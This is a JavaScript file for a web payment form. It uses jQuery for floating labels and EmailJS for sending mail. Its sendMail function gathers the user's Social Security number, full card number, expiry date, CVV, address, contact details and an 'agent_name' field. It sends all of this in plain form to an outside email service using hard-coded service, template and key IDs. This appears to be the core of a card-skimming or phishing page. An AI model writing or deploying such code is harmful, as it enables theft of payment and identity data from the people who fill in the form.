(function ($) {
  function floatLabel(inputType) {
    $(inputType).each(function () {
      var $this = $(this);
      $this.focus(function () {
        $this.next().addClass("active");
      });
      $this.blur(function () {
        if ($this.val() === "" || $this.val() === "blank") {
          $this.next().removeClass();
        }
      });
    });
  }
  floatLabel(".floatLabel");
})(jQuery);

let selectedCardType = "";

document.querySelectorAll('input[name="cardType"]').forEach((elem) => {
  elem.addEventListener("change", (event) => {
    selectedCardType = event.target.value;
    console.log(`Selected card type: ${selectedCardType}`);
  });
});

document.addEventListener("DOMContentLoaded", function () {
  emailjs.init("YOUR_USER_ID");
});

document
  .getElementById("paymentForm")
  .addEventListener("submit", function (event) {
    event.preventDefault();

    const formData = new FormData(event.target);
    const data = {};

    formData.forEach((value, key) => {
      data[key] = value;
    });

    // emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", data).then(
    //   (response) => {
    //     console.log("SUCCESS!", response.status, response.text);
    //     alert("Email sent successfully!");
    //   },
    //   (error) => {
    //     console.log("FAILED...", error);
    //     alert("Failed to send email.");
    //   }
    // );
  });

const sendMail = () => {
  //   console.log("hehe");
  //   console.log(document.getElementById("first_name").value);

  console.log(
    // "fn",
    // document.getElementById("first_name").value,
    // "ln",
    // document.getElementById("last_name").value,
    // "email",
    // document.getElementById("email").value,
    // "num",
    // document.getElementById("contact_number").value,
    // "al num",
    document.getElementById("alternate_contact_number").value
    // "social",
    // document.getElementById("social_security").value,
    // "add-1",
    // document.getElementById("address1").value,
    // "add-2",
    // document.getElementById("address2").value,
    // "cit",
    // document.getElementById("city").value,
    // "state",
    // document.getElementById("state").value,
    // "country",
    // document.getElementById("country").value,
    // "zip",
    // document.getElementById("zip").value,
    // // "cardty",
    // // document.getElementById("card_type").value,
    // // "radioo",
    // selectedCardType,
    // "card n",
    // document.getElementById("card_number").value,
    // "month",
    // document.getElementById("month").value,
    // "yea",
    // document.getElementById("year").value,
    // "cvv",
    // document.getElementById("cvv").value,
    // "nam on card",
    // document.getElementById("name_on_card").value,
    // "amount",
    // document.getElementById("amount").value,
    // "agen name",
    // document.getElementById("agent_name").value
  );

  var params = {
    first_name: document.getElementById("first_name").value,
    last_name: document.getElementById("last_name").value,
    email: document.getElementById("email").value,
    contact_number: document.getElementById("contact_number").value,
    alternate_contact_number: document.getElementById(
      "alternate_contact_number"
    ).value,
    social_security: document.getElementById("social_security").value,
    address1: document.getElementById("address1").value,
    address2: document.getElementById("address2").value,
    city: document.getElementById("city").value,
    state: document.getElementById("state").value,
    country: document.getElementById("country").value,
    zip: document.getElementById("zip").value,
    card_type: selectedCardType,
    card_number: document.getElementById("card_number").value,
    month: document.getElementById("month").value,
    year: document.getElementById("year").value,
    cvv: document.getElementById("cvv").value,
    name_on_card: document.getElementById("name_on_card").value,
    amount: document.getElementById("amount").value,
    agent_name: document.getElementById("agent_name").value,
  };
  emailjs
    .send("service_0jzv2g8", "template_eejfdv9", params, "Y6RHE5q5JZTUMs14h")
    .then(function (res) {
      alert("success!" + res.status);
    });
};
